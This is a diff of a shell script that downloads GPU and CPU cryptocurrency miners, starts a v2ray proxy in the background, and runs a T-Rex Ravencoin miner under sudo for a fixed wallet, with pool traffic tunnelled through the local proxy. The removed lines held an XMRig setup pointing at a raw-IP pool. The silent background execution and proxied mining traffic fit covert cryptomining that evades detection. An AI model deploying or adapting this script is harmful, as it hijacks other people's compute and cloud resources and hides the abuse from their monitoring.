@@ -40,65 +40,23 @@ cat > ~/v2ray/config.json<<EOL
 }
 ]
 }
-
 EOL
 
-
-cd ~/
-wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
-tar zxfv xmrig-6.22.2-linux-static-x64.tar.gz
-cd ~/xmrig-6.22.2
-cat > config.json<<EOL
-{
-    "autosave": true,
-    "cpu": {
-        "enabled": true,
-        "huge-pages": true,
-        "hw-aes": true,
-        "priority": 5,
-        "yield": false,
-        "max-threads-hint": 100,
-        "asm": true,
-        "argon2-impl": "auto",
-        "rx-threads": true,
-        "rx-cache-qos": true
-    },
-    "opencl": false,
-    "cuda": false,
-  "pools": [
-        {
-            "algo": "rx/0",
-            "coin": null,
-            "url": "3.81.227.209:3333",
-            "user": "43cx2hYimLw9YkAYxLG8Vg2TStTL3r6XmbfDfBiCY9MCViYCCaYpEzr1BUCmZTquQwLpg7Sb1FhrV4qR5EXWwvkgKdSHVLd",
-            "pass": "z",
-            "rig-id": null,
-            "nicehash": true,
-            "keepalive": false,
-            "enabled": true,
-            "tls": false,
-            "sni": false,
-            "tls-fingerprint": null,
-            "daemon": false,
-            "socks5": "127.0.0.1:1080",
-            "self-select": null,
-            "submit-to-origin": false
-       }
-    ]
-}
-EOL
 rm -rf ~/ggu
 mkdir ~/ggu
 cd ~/ggu
-wget https://github.com/develsoftware/GMinerRelease/releases/download/3.44/gminer_3_44_linux64.tar.xz
-tar -xvf gminer_3_44_linux64.tar.xz
+wget https://github.com/trexminer/T-Rex/releases/download/0.26.8/t-rex-0.26.8-linux.tar.gz
+tar zxvf t-rex-0.26.8-linux.tar.gz
 cd ~/v2ray
 nohup ./v2ray run >/dev/null 2>&1 &
-cd ~/xmrig-6.22.2
-#nohup ./xmrig > /dev/null 2>&1 &
 cd ~/ggu
 cat >minerv.sh <<EOL
-./miner --algo kawpow --server rvn.2miners.com:6060  --user RAjL88Gqz5wheEgJW4hNeEZWbDseubggkv  --proxy 127.0.0.1:1080 --cuda
+#!/bin/bash
+
+./t-rex -a kawpow -o stratum+ssl://rvn.2miners.com:16060 -u RAjL88Gqz5wheEgJW4hNeEZWbDseubggkv.super -p x \
+  --gpu-report-interval 60 \
+  --proxy 127.0.0.1:1080
 EOL
+
 chmod +x minerv.sh
-./minerv.sh 
+sudo ./minerv.sh 
